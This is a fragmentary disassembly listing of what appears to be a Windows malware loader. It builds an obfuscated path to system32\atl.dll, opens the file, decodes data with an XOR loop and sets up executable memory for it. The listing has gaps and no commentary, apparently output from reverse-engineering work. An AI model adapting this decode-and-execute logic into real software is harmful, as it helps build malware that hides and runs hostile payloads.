0x004010c0:	pushl	%ebp	; from: 0x00401439(MAY)
0x004010c1:	movl	%esp, %ebp
0x004010c3:	pushl	%ecx
0x004010c4:	movl	$0x4, -4(%ebp)
0x004010cb:	pushl	$0x40
0x004010cd:	pushl	$0x3000
0x004010d2:	movl	0x8(%ebp), %eax
0x004010d5:	pushl	%eax
0x004010f0:	pushl	%ebp	; from: 0x00401371(MAY)
0x004010f1:	movl	%esp, %ebp
0x004010f3:	subl	$0x8, %esp
0x004010f6:	movl	0x8(%ebp), %eax
0x004010f9:	movl	%eax, -4(%ebp)
0x004010fc:	movl	0xc(%ebp), %ecx
0x004010ff:	movl	%ecx, -8(%ebp)
0x00401102:	movl	-4(%ebp), %edx
0x00401105:	cmpl	-8(%ebp), %edx
0x00401108:	jae	0x00401111	; targets: 0x0040110a(MAY), 0x00401111(MAY)
0x0040110a:	movl	-4(%ebp), %eax	; from: 0x00401108(MAY)
0x0040110d:	jmp	0x00401114	; targets: 0x00401114(MAY)
0x00401111:	movl	-8(%ebp), %eax	; from: 0x00401108(MAY)
0x00401114:	movl	%ebp, %esp	; from: 0x0040110d(MAY)
0x00401116:	popl	%ebp
0x00401117:	ret	; targets: 0x00401376(MAY)

0x00401120:	pushl	%ebp	; from: 0x004013f7(MAY)
0x00401121:	movl	%esp, %ebp
0x00401123:	subl	$0x14, %esp
0x00401126:	movl	$0xf205f, -4(%ebp)
0x0040112d:	movl	$0x0, -12(%ebp)
0x00401134:	jmp	0x0040113f	; targets: 0x0040113f(MAY)
0x0040113f:	movl	-12(%ebp), %ecx	; from: 0x00401134(MAY)
0x00401142:	cmpl	0xc(%ebp), %ecx
0x00401145:	jae	0x004011a2	; targets: 0x004011a2(MAY), 0x00401147(MAY)
0x00401147:	movl	$0x16a, -4(%ebp)	; from: 0x00401145(MAY)
0x0040114e:	movl	0x8(%ebp), %edx
0x00401151:	addl	-12(%ebp), %edx
0x00401154:	movl	(%edx), %eax
0x00401156:	addl	-12(%ebp), %eax
0x00401159:	movl	0x8(%ebp), %ecx
0x0040115c:	addl	-12(%ebp), %ecx
0x0040115f:	movl	%eax, (%ecx)
0x00401161:	movl	$0xf205f, -4(%ebp)
0x00401168:	movl	-12(%ebp), %edx
0x0040116b:	addl	$0x9d5, %edx
0x00401171:	movl	%edx, 0x004431c4
0x00401177:	movl	-8(%ebp), %eax
0x0040117a:	movl	%eax, -16(%ebp)
0x0040117d:	movl	$0x16a, -4(%ebp)
0x00401184:	movl	0x004431c4, %ecx
0x0040118a:	movl	%ecx, -20(%ebp)
0x0040118d:	movl	0x8(%ebp), %edx
0x00401190:	addl	-12(%ebp), %edx
0x00401193:	movl	(%edx), %eax
0x00401195:	xorl	-20(%ebp), %eax
0x00401198:	movl	0x8(%ebp), %ecx
0x0040119b:	addl	-12(%ebp), %ecx
0x004011a2:	movl	%ebp, %esp	; from: 0x00401145(MAY)
0x004011a4:	popl	%ebp
0x004011a5:	ret	; targets: 0x004013fc(MAY)

0x004011b0:	pushl	%ebp	; from: 0x00401424(MAY), 0x004012a3(MAY)
0x004011b1:	movl	%esp, %ebp
0x004011b3:	movl	0x8(%ebp), %eax
0x004011b6:	movl	-4(%eax), %eax
0x004011b9:	popl	%ebp
0x004011ba:	ret	; targets: 0x004012a8(MAY), 0x00401429(MAY)


start:
0x004011c0:	pushl	%ebp
0x004011c1:	movl	%esp, %ebp
0x004011c3:	subl	$0x174, %esp
0x004011c9:	pusha	
0x004011ca:	movl	%ebp, 0x004431c8
0x004011d0:	movl	$0x0, -328(%ebp)
0x004011da:	pushl	$0x104
0x004011df:	leal	-272(%ebp), %eax
0x004011e5:	pushl	%eax
0x004011e6:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000030(MAY)
0x004011ec:	leal	-296(%ebp), %ecx
0x004011f2:	pushl	%ecx
0x004011f3:	pushl	$0x20019
0x004011f8:	pushl	$0x0
0x004011fa:	pushl	$0x443080
0x004011ff:	pushl	$0x80000002
0x00401204:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x0040120a:	testl	%eax, %eax
0x0040120c:	je	0x00401213	; targets: 0x0040120e(MAY), 0x00401213(MAY)
0x0040120e:	jmp	0x00401351	; targets: 0x00401351(MAY)	; from: 0x0040120c(MAY)
0x00401213:	movl	CreateFileA@kernel32.dll, %edx	; from: 0x0040120c(MAY)
0x00401219:	movl	%edx, -348(%ebp)
0x0040121f:	movl	$0x402004, -312(%ebp)
0x00401229:	movl	$0x0, -296(%ebp)
0x00401233:	movl	$0x0, -276(%ebp)
0x0040123d:	movl	$0x64, -320(%ebp)
0x00401247:	movl	$0x2, -284(%ebp)
0x00401251:	movl	$0x0, -328(%ebp)
0x0040125b:	movl	$0x0, -292(%ebp)
0x00401265:	movl	$0x1, -316(%ebp)
0x0040126f:	movl	$0x0, -328(%ebp)
0x00401279:	movl	$0x0, -292(%ebp)
0x00401283:	movl	$0x1, -316(%ebp)
0x0040128d:	movl	$0x3, -280(%ebp)
0x00401297:	call	0x004015c0	; targets: 0x004015c0(MAY)
0x0040129c:	movl	-312(%ebp), %eax	; from: 0x00401667(MAY)
0x004012a2:	pushl	%eax
0x004012a3:	call	0x004011b0	; targets: 0x004011b0(MAY)
0x004012a8:	addl	$0x4, %esp	; from: 0x004011ba(MAY)
0x004012ab:	movl	%eax, -332(%ebp)
0x004012b1:	movl	0x00443014, %ecx
0x004012b7:	pushl	%ecx
0x004012b8:	leal	-272(%ebp), %edx
0x004012be:	pushl	%edx
0x004012bf:	call	lstrlenA@kernel32.dll	; targets: 0xff000060(MAY)
0x004012c5:	leal	-272(%ebp,%eax), %eax
0x004012cc:	pushl	%eax
0x004012cd:	call	lstrcpyA@kernel32.dll	; targets: 0xff000050(MAY)
0x004012d3:	pushl	$0x0
0x004012d5:	pushl	$0x80
0x004012da:	pushl	$0x3
0x004012dc:	pushl	$0x0
0x004012de:	movl	-280(%ebp), %ecx
0x004012e4:	pushl	%ecx
0x004012e5:	movl	-316(%ebp), %edx
0x004012eb:	pushl	%edx
0x004012ec:	leal	-272(%ebp), %eax
0x004012f2:	pushl	%eax
0x004012f3:	call	-348(%ebp)	; targets: 0xff000010(MAY)
0x00401351:	movl	-328(%ebp), %edx	; from: 0x0040120e(MAY)
0x00401357:	cmpl	-332(%ebp), %edx
0x0040135d:	jae	0x004013e9	; targets: 0x004013e9(MAY), 0x00401363(MAY)
0x00401363:	movl	-340(%ebp), %eax	; from: 0x0040135d(MAY)
0x00401369:	pushl	%eax
0x0040136a:	movl	-320(%ebp), %ecx
0x00401370:	pushl	%ecx
0x00401371:	call	0x004010f0	; targets: 0x004010f0(MAY)
0x00401376:	addl	$0x8, %esp	; from: 0x00401117(MAY)
0x00401379:	movl	%eax, -344(%ebp)
0x0040137f:	movl	-344(%ebp), %edx
0x00401385:	pushl	%edx
0x00401386:	movl	-312(%ebp), %eax
0x0040138c:	addl	-292(%ebp), %eax
0x00401392:	pushl	%eax
0x00401393:	movl	-324(%ebp), %ecx
0x00401399:	addl	-328(%ebp), %ecx
0x0040139f:	pushl	%ecx
0x004013a0:	call	0x00401720	; targets: 0x00401720(MAY)
0x004013e9:	movl	-332(%ebp), %edx	; from: 0x0040135d(MAY)
0x004013ef:	pushl	%edx
0x004013f0:	movl	-324(%ebp), %eax
0x004013f6:	pushl	%eax
0x004013f7:	call	0x00401120	; targets: 0x00401120(MAY)
0x004013fc:	addl	$0x8, %esp	; from: 0x004011a5(MAY)
0x004013ff:	movl	$0x0, -292(%ebp)
0x00401409:	movl	$0x0, -352(%ebp)
0x00401413:	movl	$0x4419fc, -368(%ebp)
0x0040141d:	movl	-368(%ebp), %ecx
0x00401423:	pushl	%ecx
0x00401424:	call	0x004011b0	; targets: 0x004011b0(MAY)
0x00401429:	addl	$0x4, %esp	; from: 0x004011ba(MAY)
0x0040142c:	movl	%eax, -356(%ebp)
0x00401432:	movl	-356(%ebp), %edx
0x00401438:	pushl	%edx
0x00401439:	call	0x004010c0	; targets: 0x004010c0(MAY)
0x004015c0:	pushl	%ebp	; from: 0x00401297(MAY)
0x004015c1:	movl	%esp, %ebp
0x004015c3:	movl	0x00443014, %eax
0x004015c8:	movb	$0x6c, 0xc(%eax)
0x004015cc:	movl	0x00443014, %ecx
0x004015d2:	movb	$0x2e, 0xd(%ecx)
0x004015d6:	movl	0x00443014, %edx
0x004015dc:	movb	$0x74, 0x4(%edx)
0x004015e0:	movl	0x00443014, %eax
0x004015e5:	movb	$0x65, 0x5(%eax)
0x004015e9:	movl	0x00443014, %ecx
0x004015ef:	movb	$0x6d, 0x6(%ecx)
0x004015f3:	movl	0x00443014, %edx
0x004015f9:	movb	$0x33, 0x7(%edx)
0x004015fd:	movl	0x00443014, %eax
0x00401602:	movb	$0x32, 0x8(%eax)
0x00401606:	movl	0x00443014, %ecx
0x0040160c:	movb	$0x64, 0xe(%ecx)
0x00401610:	movl	0x00443014, %edx
0x00401616:	movb	$0x6c, 0xf(%edx)
0x0040161a:	movl	0x00443014, %eax
0x0040161f:	movb	$0x6c, 0x10(%eax)
0x00401623:	movl	0x00443014, %ecx
0x00401629:	movb	$0x5c, (%ecx)
0x0040162c:	movl	0x00443014, %edx
0x00401632:	movb	$0x73, 0x1(%edx)
0x00401636:	movl	0x00443014, %eax
0x0040163b:	movb	$0x79, 0x2(%eax)
0x0040163f:	movl	0x00443014, %ecx
0x00401645:	movb	$0x73, 0x3(%ecx)
0x00401649:	movl	0x00443014, %edx
0x0040164f:	movb	$0x5c, 0x9(%edx)
0x00401653:	movl	0x00443014, %eax
0x00401658:	movb	$0x61, 0xa(%eax)
0x0040165c:	movl	0x00443014, %ecx
0x00401662:	movb	$0x74, 0xb(%ecx)
0x00401666:	popl	%ebp
0x00401667:	ret	; targets: 0x0040129c(MAY)

0x00401720:	pushl	%ebp	; from: 0x004013a0(MAY)
0x00401721:	movl	%esp, %ebp
0x00401723:	subl	$0xc, %esp
0x00401726:	movl	$0x0, 0x004431cc
0x00401730:	jmp	0x0040173f	; targets: 0x0040173f(MAY)
0x0040173f:	movl	0x004431cc, %ecx	; from: 0x00401730(MAY)
0x00401745:	cmpl	0x10(%ebp), %ecx
0x00401748:	jae	0x00401793	; targets: 0x0040174a(MAY), 0x00401793(MAY)
0x00401793:	movl	%ebp, %esp	; from: 0x00401748(MAY)
